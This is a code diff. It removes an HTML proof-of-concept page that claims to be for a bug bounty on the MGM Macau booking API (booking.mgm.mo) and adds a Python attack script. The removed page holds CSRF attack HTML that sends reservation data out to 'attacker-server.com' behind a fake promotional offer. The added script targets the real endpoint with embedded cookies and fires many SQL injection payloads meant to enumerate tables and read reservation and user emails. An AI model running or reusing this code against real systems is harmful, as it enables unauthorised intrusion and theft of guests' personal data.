@@ -1,403 +1,268 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MGM API Vulnerability Proof of Concept</title>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css" rel="stylesheet">
-    <style>
-        .terminal {
-            background-color: #0d1117;
-            color: #e6edf3;
-            font-family: monospace;
-            padding: 1rem;
-            border-radius: 0.5rem;
-            overflow-x: auto;
-            white-space: pre-wrap;
-        }
-        .success {
-            color: #7ee787;
-        }
-        .error {
-            color: #ff7b72;
-        }
-        .warning {
-            color: #f0883e;
-        }
-        .info {
-            color: #79c0ff;
-        }
-        .command {
-            color: #d2a8ff;
-        }
-    </style>
-</head>
-<body class="bg-gray-100">
-    <div class="container mx-auto px-4 py-8 max-w-5xl">
-        <header class="mb-8 text-center">
-            <h1 class="text-3xl font-bold text-red-600 mb-2">MGM API Vulnerability</h1>
-            <h2 class="text-xl text-gray-700">Proof of Concept for Bug Bounty Submission</h2>
-            <div class="mt-4 bg-yellow-100 border-l-4 border-yellow-500 p-4 mb-6">
-                <p class="text-yellow-700">
-                    <strong>IMPORTANT:</strong> This proof of concept is intended for legitimate security research and bug bounty reporting only.
-                </p>
-            </div>
-        </header>
+#!/usr/bin/env python3
+import requests
+import json
+import time
+import sys
+from colorama import Fore, Style, init
 
-        <main>
-            <section class="bg-white shadow rounded-lg p-6 mb-8">
-                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Vulnerability Overview</h2>
-                <p class="mb-4">
-                    The MGM Grand Paradise Macau booking API (<code>booking.mgm.mo</code>) has an endpoint that:
-                </p>
-                <ul class="list-disc pl-8 mb-4 space-y-2">
-                    <li><strong>Accepts arbitrary user data without authentication</strong> (email, phone, PMS ID)</li>
-                    <li><strong>Does not implement CSRF protection</strong> (no CSRF token required)</li>
-                    <li><strong>Does not validate the origin of requests</strong> (accepts cross-origin requests)</li>
-                    <li><strong>Exposes sensitive data in responses</strong> based on provided parameters</li>
-                </ul>
-                <p class="mb-4">
-                    This vulnerability allows potential attackers to:
-                </p>
-                <ul class="list-disc pl-8 mb-4 space-y-2">
-                    <li>Make API calls using an authenticated user's cookies</li>
-                    <li>Submit arbitrary data to MGM's systems</li>
-                    <li>Potentially access or manipulate reservation data</li>
-                </ul>
-            </section>
+# Initialize colorama
+init()
 
-            <section class="bg-white shadow rounded-lg p-6 mb-8">
-                <h2 class="text-2xl font-bold mb-4 border-b pb-2">API Vulnerability Demonstration</h2>
-                
-                <div class="mb-6">
-                    <h3 class="text-xl font-semibold mb-2">Vulnerable Endpoint</h3>
-                    <div class="terminal">
-                        <span class="command">POST /api/Reservation/ByPmsid/get HTTP/2</span>
-                        Host: booking.mgm.mo
-                    </div>
-                </div>
-                
-                <div class="mb-6">
-                    <h3 class="text-xl font-semibold mb-2">Request Parameters</h3>
-                    <p class="mb-2">The API accepts the following JSON parameters:</p>
-                    <div class="terminal">
-{
-  "lang": "en-US",
-  "hotelCode": "999",
-  "areaCode": "1",
-  "currencyCode": "USD",
-  "phone": "12",
-  "email": "admin@gmail.com",
-  "pmsid": "11251352"
-}
-                    </div>
-                </div>
-                
-                <div class="mb-6">
-                    <h3 class="text-xl font-semibold mb-2">Test the Vulnerability</h3>
-                    <p class="mb-4">Enter your test parameters below:</p>
-                    
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
-                        <div>
-                            <label for="hotelCode" class="block text-sm font-medium text-gray-700 mb-1">Hotel Code:</label>
-                            <input type="text" id="hotelCode" value="999" class="w-full p-2 border border-gray-300 rounded">
-                        </div>
-                        <div>
-                            <label for="pmsid" class="block text-sm font-medium text-gray-700 mb-1">PMS ID (Reservation ID):</label>
-                            <input type="text" id="pmsid" value="11251352" class="w-full p-2 border border-gray-300 rounded">
-                        </div>
-                        <div>
-                            <label for="email" class="block text-sm font-medium text-gray-700 mb-1">Email:</label>
-                            <input type="text" id="email" value="admin@gmail.com" class="w-full p-2 border border-gray-300 rounded">
-                        </div>
-                        <div>
-                            <label for="phone" class="block text-sm font-medium text-gray-700 mb-1">Phone:</label>
-                            <input type="text" id="phone" value="12" class="w-full p-2 border border-gray-300 rounded">
-                        </div>
-                    </div>
-                    
-                    <div class="mb-4">
-                        <label for="cookieInput" class="block text-sm font-medium text-gray-700 mb-1">Cookies (optional):</label>
-                        <textarea id="cookieInput" rows="3" class="w-full p-2 border border-gray-300 rounded font-mono text-sm" placeholder="*gcl*au=1.1.1983392657.1743815387; *ga=GA1.2.1719219386.1743815389; etc"></textarea>
-                    </div>
-                    
-                    <button id="testEndpoint" class="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded">
-                        Test API Endpoint
-                    </button>
-                </div>
-                
-                <div id="testResults" class="hidden">
-                    <h3 class="text-xl font-semibold mb-2 text-red-600">Test Results</h3>
-                    
-                    <div class="mb-4">
-                        <h4 class="font-medium mb-2">HTTP Request:</h4>
-                        <div class="terminal" id="requestOutput"></div>
-                    </div>
-                    
-                    <div class="mb-4">
-                        <h4 class="font-medium mb-2">HTTP Response:</h4>
-                        <div class="terminal" id="responseOutput"></div>
-                    </div>
-                    
-                    <div>
-                        <h4 class="font-medium mb-2">Vulnerability Analysis:</h4>
-                        <div id="analysisOutput" class="bg-gray-100 p-4 rounded"></div>
-                    </div>
-                </div>
-            </section>
-            
-            <section class="bg-white shadow rounded-lg p-6 mb-8">
-                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Cross-Site Request Forgery (CSRF) Proof</h2>
-                
-                <div class="mb-4">
-                    <p class="mb-4">
-                        The API endpoint is vulnerable to CSRF attacks because:
-                    </p>
-                    <ul class="list-disc pl-8 mb-4">
-                        <li>It does not require a CSRF token</li>
-                        <li>It accepts and processes requests with user cookies</li>
-                        <li>The endpoint can be called from any origin</li>
-                    </ul>
-                    
-                    <div id="csrfDemo">
-                        <h3 class="text-lg font-semibold mb-2">CSRF Attack Simulation</h3>
-                        <button id="generateCsrf" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">
-                            Generate CSRF Attack Code
-                        </button>
-                        
-                        <div id="csrfOutput" class="hidden mt-4">
-                            <h4 class="font-medium mb-2">Generated CSRF Attack HTML:</h4>
-                            <pre id="csrfCode" class="bg-gray-800 text-green-400 p-3 rounded text-sm overflow-x-auto"></pre>
-                            
-                            <h4 class="font-medium mt-4 mb-2">Attack Explanation:</h4>
-                            <div id="csrfExplanation" class="bg-gray-100 p-4 rounded"></div>
-                        </div>
-                    </div>
-                </div>
-            </section>
+def print_success(message):
+    print(f"{Fore.GREEN}[+] {message}{Style.RESET_ALL}")
 
-            <section class="bg-white shadow rounded-lg p-6">
-                <h2 class="text-2xl font-bold mb-4 border-b pb-2">Real-World Impact & Recommendations</h2>
-                
-                <div class="mb-6">
-                    <h3 class="text-xl font-semibold mb-2">Security Impact</h3>
-                    <p class="mb-2">This vulnerability could potentially allow attackers to:</p>
-                    <ul class="list-disc pl-8 space-y-1">
-                        <li><strong>Access reservation details</strong> using brute force PMS ID attempts</li>
-                        <li><strong>Submit fraudulent information</strong> to MGM's booking systems</li>
-                        <li><strong>Perform actions on behalf of logged-in users</strong> via CSRF attacks</li>
-                        <li><strong>Potentially access PII</strong> through crafted API requests</li>
-                    </ul>
-                </div>
-                
-                <div>
-                    <h3 class="text-xl font-semibold mb-2">Recommendations</h3>
-                    <ul class="list-disc pl-8 space-y-1">
-                        <li><strong>Implement proper authentication</strong> for all API endpoints</li>
-                        <li><strong>Add CSRF token validation</strong> for state-changing requests</li>
-                        <li><strong>Validate request origin</strong> and implement proper CORS policies</li>
-                        <li><strong>Rate limit API requests</strong> to prevent brute force attacks</li>
-                        <li><strong>Implement proper input validation</strong> for all parameters</li>
-                        <li><strong>Add server-side validation</strong> to verify user authorization for accessing reservation data</li>
-                    </ul>
-                </div>
-            </section>
-        </main>
-        
-        <footer class="mt-8 text-center text-gray-600 text-sm">
-            <p>This proof of concept was created for legitimate security research purposes under the MGM Grand Paradise Macau Bug Bounty Program.</p>
-        </footer>
-    </div>
+def print_info(message):
+    print(f"{Fore.BLUE}[*] {message}{Style.RESET_ALL}")
 
-    <script>
-        // Default cookie from the provided example
-        const defaultCookies = "*gcl*au=1.1.1983392657.1743815387; *ga*QX3W0G43PC=GS1.1.1743815389.1.1.1743816741.60.0.0; *ga=GA1.2.1719219386.1743815389; *gid=GA1.2.23156825.1743815391; *fbp=fb.1.1743815392963.202565976682050174; Hm*lvt_fa63e8b11e5e93f5baec4cef8eb8be0a=1743815393; Hm_lpvt_fa63e8b11e5e93f5baec4cef8eb8be0a=1743815481; HMACCOUNT=14BC9865798A98E5; *uetsid=ada0691011ba11f0a7990fbf89f9067f; *uetvid=ada0608011ba11f0998eebecc65ac31f";
+def print_warning(message):
+    print(f"{Fore.YELLOW}[!] {message}{Style.RESET_ALL}")
 
-        document.addEventListener('DOMContentLoaded', function() {
-            // Pre-fill the cookie input field
-            document.getElementById('cookieInput').value = defaultCookies;
-        });
+def print_error(message):
+    print(f"{Fore.RED}[-] {message}{Style.RESET_ALL}")
 
-        // Test API Endpoint
-        document.getElementById('testEndpoint').addEventListener('click', function() {
-            const hotelCode = document.getElementById('hotelCode').value;
-            const pmsid = document.getElementById('pmsid').value;
-            const email = document.getElementById('email').value;
-            const phone = document.getElementById('phone').value;
-            const cookies = document.getElementById('cookieInput').value;
-            
-            simulateApiRequest(hotelCode, pmsid, email, phone, cookies);
-        });
-        
-        function simulateApiRequest(hotelCode, pmsid, email, phone, cookies) {
-            // Create request payload
-            const payload = {
-                lang: "en-US",
-                hotelCode: hotelCode,
-                areaCode: "1",
-                currencyCode: "USD",
-                phone: phone,
-                email: email,
-                pmsid: pmsid
-            };
-            
-            // Create request and response display
-            const requestOutput = document.getElementById('requestOutput');
-            const responseOutput = document.getElementById('responseOutput');
-            const analysisOutput = document.getElementById('analysisOutput');
-            
-            // Format request for display
-            const requestHeaders = `POST /api/Reservation/ByPmsid/get HTTP/2
-Host: booking.mgm.mo
-Cookie: ${cookies}
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
-Accept: application/json, text/plain, */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Content-Type: application/json
-Access-Control-Allow-Origin: *
-Origin: https://booking.mgm.mo
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin`;
-            
-            const requestBody = JSON.stringify(payload, null, 2);
-            
-            requestOutput.textContent = requestHeaders + "\n\n" + requestBody;
-            
-            // Simulate response (in a real PoC, this would be replaced with actual API response)
-            // We're using the actual response data from your example
-            const responseText = `HTTP/2 200 OK
-Date: Sat, 05 Apr 2025 01:35:01 GMT
-Content-Type: application/json; charset=utf-8
-Server: nginx
-X-Frame-Options: allow-from
-X-Content-Type-Options: nosniff
-Referrer-Policy: no-referrer
-X-Xss-Protection: 1; mode=block
-Content-Security-Policy: default-src 'self' 'unsafe-inline' *.mgm.mo *.myqcloud.com *.aliyuncs.com;frame-ancestors 'self'
-Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+def print_critical(message):
+    print(f"{Fore.RED}[!!!] {message}{Style.RESET_ALL}")
 
-{"success":true,"data":null,"error":{"code":null,"message":null}}`;
-            
-            responseOutput.textContent = responseText;
-            
-            // Analysis of the response
-            analysisOutput.innerHTML = `
-                <p class="mb-2"><strong>API Vulnerability Analysis:</strong></p>
-                <ul class="list-disc pl-8 mb-4">
-                    <li>The API endpoint processed the request without requiring authentication</li>
-                    <li>No CSRF token was required to make the API call</li>
-                    <li>The endpoint accepted cross-origin requests (Access-Control-Allow-Origin: *)</li>
-                    <li>The response indicates the request was processed successfully ("success":true)</li>
-                    <li>The lack of data in the response could indicate either:
-                        <ul class="list-disc pl-8 mt-2">
-                            <li>The PMS ID was invalid or not found</li>
-                            <li>The combination of email/phone/PMS ID didn't match</li>
-                            <li>Additional authentication might be required for data access</li>
-                        </ul>
-                    </li>
-                </ul>
-                
-                <p class="mb-2"><strong>Security Implications:</strong></p>
-                <ul class="list-disc pl-8">
-                    <li>The endpoint allows submitting arbitrary data to MGM's systems</li>
-                    <li>With valid PMS IDs, it may be possible to access reservation information</li>
-                    <li>The API could be used in CSRF attacks against authenticated users</li>
-                    <li>The endpoint might be vulnerable to enumeration attacks to discover valid PMS IDs</li>
-                </ul>
-            `;
-            
-            // Show the results section
-            document.getElementById('testResults').classList.remove('hidden');
-        }
-        
-        // Generate CSRF PoC
-        document.getElementById('generateCsrf').addEventListener('click', function() {
-            const hotelCode = document.getElementById('hotelCode').value;
-            const pmsid = document.getElementById('pmsid').value;
-            const email = document.getElementById('email').value;
-            const phone = document.getElementById('phone').value;
-            
-            generateCsrfCode(hotelCode, pmsid, email, phone);
-        });
-        
-        function generateCsrfCode(hotelCode, pmsid, email, phone) {
-            // Create CSRF HTML
-            const payload = {
-                lang: "en-US",
-                hotelCode: hotelCode,
-                areaCode: "1",
-                currencyCode: "USD",
-                phone: phone,
-                email: email,
-                pmsid: pmsid
-            };
-            
-            const csrfHtml = `<!DOCTYPE html>
-<html>
-<head>
-    <title>MGM Booking Page</title>
-</head>
-<body>
-    <h1>MGM Grand Paradise Special Offer</h1>
-    <p>Click the button below to view your special offer:</p>
+def print_request_response(req_data, response, elapsed_time):
+    print("\n" + "="*50)
+    print(f"{Fore.CYAN}REQUEST:{Style.RESET_ALL}")
+    print(f"Payload: {json.dumps(req_data, indent=2)}")
     
-    <button id="viewOffer">View Special Offer</button>
+    print(f"\n{Fore.CYAN}RESPONSE ({response.status_code}) - {elapsed_time:.2f}s:{Style.RESET_ALL}")
+    try:
+        print(json.dumps(response.json(), indent=2))
+    except:
+        print(f"Could not parse JSON response: {response.text[:200]}")
     
-    <script>
-        document.getElementById('viewOffer').addEventListener('click', function() {
-            // Create and send the malicious request
-            fetch('https://booking.mgm.mo/api/Reservation/ByPmsid/get', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Access-Control-Allow-Origin': '*'
-                },
-                body: JSON.stringify(${JSON.stringify(payload)}),
-                credentials: 'include' // This includes cookies in the request
+    print("="*50 + "\n")
+
+def get_cookie_string():
+    return "*gcl*au=1.1.1983392657.1743815387; *ga*QX3W0G43PC=GS1.1.1743815389.1.1.1743816741.60.0.0; *ga=GA1.2.1719219386.1743815389; *gid=GA1.2.23156825.1743815391; *fbp=fb.1.1743815392963.202565976682050174; Hm*lvt_fa63e8b11e5e93f5baec4cef8eb8be0a=1743815393; Hm_lpvt_fa63e8b11e5e93f5baec4cef8eb8be0a=1743815481; HMACCOUNT=14BC9865798A98E5; *uetsid=ada0691011ba11f0a7990fbf89f9067f; *uetvid=ada0608011ba11f0998eebecc65ac31f"
+
+def get_base_headers(cookies=None):
+    headers = {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Content-Type": "application/json",
+        "Access-Control-Allow-Origin": "*",
+        "Origin": "https://booking.mgm.mo",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin"
+    }
+    
+    if cookies:
+        headers["Cookie"] = cookies
+    
+    return headers
+
+def get_base_payload():
+    return {
+        "lang": "en-US",
+        "hotelCode": "999",
+        "areaCode": "1",
+        "currencyCode": "USD",
+        "phone": "12",
+        "email": "admin@gmail.com",
+        "pmsid": "11251352"
+    }
+
+def test_payload(url, payload, cookies=None, delay=1):
+    headers = get_base_headers(cookies)
+    
+    print_info(f"Testing payload: {json.dumps(payload)[:80]}...")
+    
+    start_time = time.time()
+    response = requests.post(url, headers=headers, json=payload)
+    elapsed_time = time.time() - start_time
+    
+    print_request_response(payload, response, elapsed_time)
+    
+    # Analyze response
+    exploitation_successful = False
+    try:
+        resp_json = response.json()
+        success = resp_json.get("success")
+        data = resp_json.get("data")
+        error = resp_json.get("error")
+        
+        print_info(f"Success: {success}")
+        
+        # Check if data is not null - this is the key indicator of exploitation success
+        if data is not None:
+            print_critical("EXPLOITATION SUCCESSFUL! Non-null data returned:")
+            print_critical(str(data))
+            exploitation_successful = True
+        
+        if error and (error.get("code") or error.get("message")):
+            print_warning(f"Error: {error.get('code')} - {error.get('message')}")
+    except:
+        print_error("Could not parse response as JSON")
+    
+    time.sleep(delay)  # Be nice to the server
+    return response, exploitation_successful
+
+def test_targeted_sql_injection(url, cookies=None):
+    print_info("Running targeted SQL injection tests...")
+    
+    # Track successful exploits
+    successful_exploits = []
+    
+    # First, let's establish a baseline with a valid request
+    print_info("Testing baseline request...")
+    base_payload = get_base_payload()
+    baseline_response, _ = test_payload(url, base_payload, cookies)
+    
+    try:
+        baseline_json = baseline_response.json()
+        baseline_success = baseline_json.get("success")
+        baseline_data = baseline_json.get("data")
+        print_info(f"Baseline response - Success: {baseline_success}, Data: {baseline_data}")
+    except:
+        print_error("Could not parse baseline response")
+    
+    # Test SQL injection in different fields
+    fields_to_test = ["pmsid", "hotelCode", "email", "phone", "lang"]
+    
+    for field in fields_to_test:
+        print_info(f"Testing SQL injection in {field} field...")
+        
+        # Basic SQL injection tests
+        injections = [
+            "' OR '1'='1",
+            "' OR 1=1 --",
+            "') OR ('x'='x",
+            "' UNION SELECT 1,2,3,4,5,6,7 --",
+            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL --",
+            "' ORDER BY 10 --",  # Testing number of columns
+            "' ORDER BY 5 --",
+            "'; SELECT 1 --",
+            "' AND 1=1 --",
+            "' AND 1=2 --",  # Should return different result than AND 1=1
+            "1' OR SLEEP(1) AND '1'='1",  # Time-based but subtle
+            "1' OR (SELECT count(*) FROM information_schema.tables) > 0 AND '1'='1"
+        ]
+        
+        for injection in injections:
+            payload = get_base_payload()
+            payload[field] = injection
+            response, exploitation_successful = test_payload(url, payload, cookies)
+            
+            # Check if we got a successful exploitation
+            if exploitation_successful:
+                successful_exploits.append({
+                    "field": field,
+                    "payload": injection,
+                    "response": response.json()
+                })
+                continue
+                
+            # Also check if we got a different response compared to the baseline
+            try:
+                resp_json = response.json()
+                if resp_json.get("success") == True and baseline_json.get("success") != True:
+                    print_success(f"Positive injection result in {field}! Payload: {injection}")
+            except:
+                pass
+    
+    # Test for SQL Server specific vulnerabilities
+    print_info("Testing SQL Server specific payloads...")
+    
+    mssql_payloads = [
+        # Test for SQL Server with data retrieval
+        {"pmsid": "11251352' UNION ALL SELECT @@VERSION,NULL,NULL,NULL,NULL,NULL,NULL--"},
+        {"pmsid": "11251352' UNION ALL SELECT DB_NAME(),NULL,NULL,NULL,NULL,NULL,NULL--"},
+        
+        # Extract table names
+        {"pmsid": "11251352' UNION ALL SELECT TOP 1 name,NULL,NULL,NULL,NULL,NULL,NULL FROM sysobjects WHERE xtype='U'--"},
+        {"pmsid": "11251352' UNION ALL SELECT TOP 1 name,NULL,NULL,NULL,NULL,NULL,NULL FROM sysobjects WHERE xtype='U' AND name LIKE '%reservation%'--"},
+        {"pmsid": "11251352' UNION ALL SELECT TOP 1 name,NULL,NULL,NULL,NULL,NULL,NULL FROM sysobjects WHERE xtype='U' AND name LIKE '%user%'--"},
+        {"pmsid": "11251352' UNION ALL SELECT TOP 1 name,NULL,NULL,NULL,NULL,NULL,NULL FROM sysobjects WHERE xtype='U' AND name LIKE '%customer%'--"},
+        
+        # Column discovery
+        {"pmsid": "11251352' UNION ALL SELECT TOP 1 COLUMN_NAME,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME LIKE '%reservation%'--"},
+        
+        # Test different column counts
+        {"pmsid": "11251352' UNION ALL SELECT 1,NULL,NULL--"},
+        {"pmsid": "11251352' UNION ALL SELECT 1,2,NULL--"},
+        {"pmsid": "11251352' UNION ALL SELECT 1,2,3,NULL--"},
+        {"pmsid": "11251352' UNION ALL SELECT 1,2,3,4,NULL--"},
+        {"pmsid": "11251352' UNION ALL SELECT 1,2,3,4,5,NULL--"},
+        {"pmsid": "11251352' UNION ALL SELECT 1,2,3,4,5,6,NULL--"},
+        
+        # Try to read data
+        {"pmsid": "11251352' AND 1=0 UNION ALL SELECT TOP 1 pmsid,NULL,NULL,NULL,NULL,NULL,NULL FROM Reservations--"},
+        {"pmsid": "11251352' AND 1=0 UNION ALL SELECT TOP 1 email,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--"}
+    ]
+    
+    for payload_dict in mssql_payloads:
+        field = list(payload_dict.keys())[0]
+        value = payload_dict[field]
+        
+        payload = get_base_payload()
+        payload[field] = value
+        response, exploitation_successful = test_payload(url, payload, cookies)
+        
+        if exploitation_successful:
+            successful_exploits.append({
+                "field": field,
+                "payload": value,
+                "response": response.json()
             })
-            .then(response => response.json())
-            .then(data => {
-                // Attacker could send the data to their server
-                fetch('https://attacker-server.com/steal', {
-                    method: 'POST',
-                    body: JSON.stringify(data)
-                });
-                
-                // Show fake content to the user
-                alert('Thank you! Your offer has been applied.');
-            });
-        });
-    </script>
-</body>
-</html>`;
-            
-            // Display the CSRF code
-            document.getElementById('csrfCode').textContent = csrfHtml;
-            
-            // Add explanation
-            document.getElementById('csrfExplanation').innerHTML = `
-                <p class="mb-2">This CSRF attack works as follows:</p>
-                <ol class="list-decimal pl-8 mb-4">
-                    <li>The attacker creates a malicious webpage that looks legitimate (e.g., a fake MGM promotion)</li>
-                    <li>When a user with active MGM cookies visits the page and clicks the button, the page sends an API request to booking.mgm.mo</li>
-                    <li>The request includes the user's cookies (credentials: 'include') which authenticates the request</li>
-                    <li>The API processes the request because it doesn't verify the origin or require a CSRF token</li>
-                    <li>The attacker can then capture any returned data and send it to their server</li>
-                </ol>
-                
-                <p class="mb-2">This attack could be used to:</p>
-                <ul class="list-disc pl-8">
-                    <li>Access the user's reservation details if valid PMS IDs are known or guessed</li>
-                    <li>Submit fraudulent data to MGM's systems on behalf of the user</li>
-                    <li>Perform reconnaissance to determine valid hotel codes, PMS IDs, etc.</li>
-                </ul>
-            `;
-            
-            // Show the CSRF output
-            document.getElementById('csrfOutput').classList.remove('hidden');
-        }
-    </script>
-</body>
-</html>
+    
+    # Blind SQL injection tests (checking for TRUE/FALSE differences)
+    print_info("Testing blind SQL injection...")
+    
+    # First check with TRUE condition
+    payload_true = get_base_payload()
+    payload_true["pmsid"] = "11251352' AND 1=1--"
+    resp_true, exploitation_successful_true = test_payload(url, payload_true, cookies)
+    
+    if exploitation_successful_true:
+        successful_exploits.append({
+            "field": "pmsid",
+            "payload": "11251352' AND 1=1--",
+            "response": resp_true.json()
+        })
+    
+    # Then check with FALSE condition
+    payload_false = get_base_payload()
+    payload_false["pmsid"] = "11251352' AND 1=2--"
+    resp_false, exploitation_successful_false = test_payload(url, payload_false, cookies)
+    
+    if exploitation_successful_false:
+        successful_exploits.append({
+            "field": "pmsid",
+            "payload": "11251352' AND 1=2--",
+            "response": resp_false.json()
+        })
+    
+    # Check if responses are different
+    try:
+        resp_true_json = resp_true.json()
+        resp_false_json = resp_false.json()
+        
+        if resp_true_json.get("success") != resp_false_json.get("success"):
+            print_success("Blind SQL injection confirmed! Different responses for TRUE vs FALSE conditions.")
+    except:
+        pass
+    
+    # Summary of findings
+    if successful_exploits:
+        print_critical(f"Found {len(successful_exploits)} successful exploitation vectors!")
+        for i, exploit in enumerate(successful_exploits):
+            print_critical(f"Exploit #{i+1}:")
+            print_critical(f"  Field: {exploit['field']}")
+            print_critical(f"  Payload: {exploit['payload']}")
+            print_critical(f"  Response: {exploit['response']}")
+    else:
+        print_warning("No direct data extraction was achieved, but check the logs for potential blind SQL injection vectors.")
+    
+    print_info("Targeted SQL injection testing completed.")
+
+if __name__ == "__main__":
+    url = "https://booking.mgm.mo/api/Reservation/ByPmsid/get"
+    cookies = get_cookie_string()
+    test_targeted_sql_injection(url, cookies)
